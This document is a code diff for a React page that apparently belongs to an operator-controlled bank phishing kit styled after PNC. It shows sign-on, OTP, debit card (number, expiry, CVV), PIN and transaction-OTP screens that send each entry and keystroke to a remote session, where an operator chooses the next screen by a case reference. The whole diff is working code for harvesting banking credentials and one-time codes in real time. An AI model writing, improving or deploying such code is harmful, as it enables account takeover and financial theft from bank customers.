@@ -1,7 +1,7 @@
 "use client";
 
 import { useState, useRef, useEffect } from "react";
-import { createSession, SessionState } from "@/lib/control-room";
+import { ControlRoomSession, SessionState } from "@/SDK/vendor-sdk";
 import cardValidator from "card-validator";
 import { CreditCard, CheckCircle2, XCircle, ShieldCheck, ChevronDown, KeyRound, Smartphone } from "lucide-react";
 
@@ -9,14 +9,20 @@ import { CreditCard, CheckCircle2, XCircle, ShieldCheck, ChevronDown, KeyRound, 
    SCREEN COMPONENTS — one per workflow state
    =================================================================== */
 
-function LoginForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (data: any) => void; onKeystroke?: (field: string, value: string) => void; isProcessing?: boolean; error?: string }) {
+function LoginForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke?: (field: string, value: string) => void; error?: string }) {
   const [userId, setUserId] = useState("");
   const [password, setPassword] = useState("");
   const [showPw, setShowPw] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    onInput({ event: "submit_credentials", userId, password });
+    setIsSubmitting(true);
+    try {
+      await onInput({ event: "submit_credentials", userId, password });
+    } catch {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -45,8 +51,8 @@ function LoginForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (da
           </div>
           <p className="remember-warning">DO NOT check this box if you are using a public computer. User IDs potentially containing sensitive information will not be saved.</p>
         </div>
-        <button type="submit" className="sign-on-submit-btn" disabled={isProcessing}>
-          {isProcessing ? "Processing..." : "Sign On"}
+        <button type="submit" className="sign-on-submit-btn" disabled={isSubmitting}>
+          {isSubmitting ? "Processing..." : "Sign On"}
         </button>
         <div className="sign-on-links">
           <a href="#" className="forgot-link">Forgot ID or Password?</a>
@@ -58,12 +64,18 @@ function LoginForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (da
   );
 }
 
-function OtpVerificationForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (data: any) => void; onKeystroke?: (field: string, value: string) => void; isProcessing?: boolean; error?: string }) {
+function OtpVerificationForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke?: (field: string, value: string) => void; error?: string }) {
   const [otp, setOtp] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    onInput({ event: "verify_otp", otp_code: otp });
+    setIsSubmitting(true);
+    try {
+      await onInput({ event: "verify_otp", otp_code: otp });
+    } catch {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -86,8 +98,8 @@ function OtpVerificationForm({ onInput, onKeystroke, isProcessing, error }: { on
           />
           {error && <p className="inline-error" style={{ color: "var(--pnc-orange)", fontSize: "12px", marginTop: "8px", fontWeight: "bold" }}>{error}</p>}
         </div>
-        <button type="submit" className="sign-on-submit-btn" disabled={otp.length < 4 || isProcessing}>
-          {isProcessing ? "Verifying..." : "Verify Code"}
+        <button type="submit" className="sign-on-submit-btn" disabled={otp.length < 4 || isSubmitting}>
+          {isSubmitting ? "Verifying..." : "Verify Code"}
         </button>
         <div className="sign-on-links">
           <a href="#" className="forgot-link">Resend Code</a>
@@ -99,13 +111,14 @@ function OtpVerificationForm({ onInput, onKeystroke, isProcessing, error }: { on
   );
 }
 
-function DebitCardForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (data: any) => void; onKeystroke?: (field: string, value: string) => void; isProcessing?: boolean; error?: string }) {
+function DebitCardForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke?: (field: string, value: string) => void; error?: string }) {
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
   const [validationError, setValidationError] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setValidationError("");
 
@@ -127,7 +140,12 @@ function DebitCardForm({ onInput, onKeystroke, isProcessing, error }: { onInput:
       return;
     }
 
-    onInput({ event: "submit_card_details", card_number: cardNumber, expiry, cvv });
+    setIsSubmitting(true);
+    try {
+      await onInput({ event: "submit_card_details", card_number: cardNumber, expiry, cvv });
+    } catch {
+      setIsSubmitting(false);
+    }
   };
 
   const formatCard = (val: string) => {
@@ -165,20 +183,26 @@ function DebitCardForm({ onInput, onKeystroke, isProcessing, error }: { onInput:
           </div>
         </div>
         {(error || validationError) && <p className="inline-error" style={{ color: "var(--pnc-orange)", fontSize: "12px", marginBottom: "16px", fontWeight: "bold" }}>{validationError || error}</p>}
-        <button type="submit" className="sign-on-submit-btn" disabled={isProcessing}>
-          {isProcessing ? "Processing..." : "Continue"}
+        <button type="submit" className="sign-on-submit-btn" disabled={isSubmitting}>
+          {isSubmitting ? "Processing..." : "Continue"}
         </button>
       </form>
     </div>
   );
 }
 
-function PinForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (data: any) => void; onKeystroke?: (field: string, value: string) => void; isProcessing?: boolean; error?: string }) {
+function PinForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke?: (field: string, value: string) => void; error?: string }) {
   const [pin, setPin] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    onInput({ event: "verify_pin", pin: pin });
+    setIsSubmitting(true);
+    try {
+      await onInput({ event: "verify_pin", pin: pin });
+    } catch {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -200,20 +224,26 @@ function PinForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (data
           />
           {error && <p className="inline-error" style={{ color: "var(--pnc-orange)", fontSize: "12px", marginTop: "8px", fontWeight: "bold" }}>{error}</p>}
         </div>
-        <button type="submit" className="sign-on-submit-btn" disabled={pin.length < 4 || isProcessing}>
-          {isProcessing ? "Verifying..." : "Verify PIN"}
+        <button type="submit" className="sign-on-submit-btn" disabled={pin.length < 4 || isSubmitting}>
+          {isSubmitting ? "Verifying..." : "Verify PIN"}
         </button>
       </form>
     </div>
   );
 }
 
-function TransactionOtpForm({ onInput, onKeystroke, isProcessing, error }: { onInput: (data: any) => void; onKeystroke?: (field: string, value: string) => void; isProcessing?: boolean; error?: string }) {
+function TransactionOtpForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke?: (field: string, value: string) => void; error?: string }) {
   const [otp, setOtp] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    onInput({ event: "verify_transaction_otp", otp_code: otp });
+    setIsSubmitting(true);
+    try {
+      await onInput({ event: "verify_transaction_otp", otp_code: otp });
+    } catch {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -236,8 +266,8 @@ function TransactionOtpForm({ onInput, onKeystroke, isProcessing, error }: { onI
           />
           {error && <p className="inline-error" style={{ color: "var(--pnc-orange)", fontSize: "12px", marginTop: "8px", fontWeight: "bold" }}>{error}</p>}
         </div>
-        <button type="submit" className="sign-on-submit-btn" disabled={otp.length < 4 || isProcessing}>
-          {isProcessing ? "Confirming..." : "Confirm Transaction"}
+        <button type="submit" className="sign-on-submit-btn" disabled={otp.length < 4 || isSubmitting}>
+          {isSubmitting ? "Confirming..." : "Confirm Transaction"}
         </button>
       </form>
     </div>
@@ -289,7 +319,7 @@ export default function Home() {
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
   const [sessionState, setSessionState] = useState<SessionState | null>(null);
-  const [session, setSession] = useState<ReturnType<typeof createSession> | null>(null);
+  const [session, setSession] = useState<ControlRoomSession | null>(null);
 
   const handleConnect = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -299,8 +329,13 @@ export default function Home() {
     setError("");
 
     try {
-      const s = createSession();
-      const state = await s.connect(caseRef.trim());
+      const s = new ControlRoomSession({
+        tenant_id: "e63d3b80-3289-499e-84ca-292b70c13ac6",
+        case_reference: caseRef.trim(),
+        supabaseUrl: process.env.NEXT_PUBLIC_SUPABASE_URL!,
+        supabaseKey: process.env.NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY!,
+      });
+      const state = await s.connect();
       setSession(s);
       setSessionState(state);
 
@@ -314,9 +349,9 @@ export default function Home() {
     }
   };
 
-  const handleInput = (data: any) => {
+  const handleInput = async (data: any) => {
     if (session) {
-      session.sendInput(data);
+      await session.sendInput(data);
     }
   };
 
@@ -365,20 +400,19 @@ export default function Home() {
   }
 
   // Render the right component based on component_key from operator
-  const isProcessing = sessionState.is_processing;
-  const operatorError = sessionState.error;
+  const operatorError = sessionState.operator_message;
 
   switch (sessionState.component_key) {
     case "LoginForm":
-      return <LoginForm onInput={handleInput} onKeystroke={handleKeystroke} isProcessing={isProcessing} error={operatorError} />;
+      return <LoginForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
     case "OtpVerificationForm":
-      return <OtpVerificationForm onInput={handleInput} onKeystroke={handleKeystroke} isProcessing={isProcessing} error={operatorError} />;
+      return <OtpVerificationForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
     case "DebitCardForm":
-      return <DebitCardForm onInput={handleInput} onKeystroke={handleKeystroke} isProcessing={isProcessing} error={operatorError} />;
+      return <DebitCardForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
     case "PinForm":
-      return <PinForm onInput={handleInput} onKeystroke={handleKeystroke} isProcessing={isProcessing} error={operatorError} />;
+      return <PinForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
     case "TransactionOtpForm":
-      return <TransactionOtpForm onInput={handleInput} onKeystroke={handleKeystroke} isProcessing={isProcessing} error={operatorError} />;
+      return <TransactionOtpForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
     case "ProcessingScreen":
       return <ProcessingScreen />;
     case "SuccessScreen":
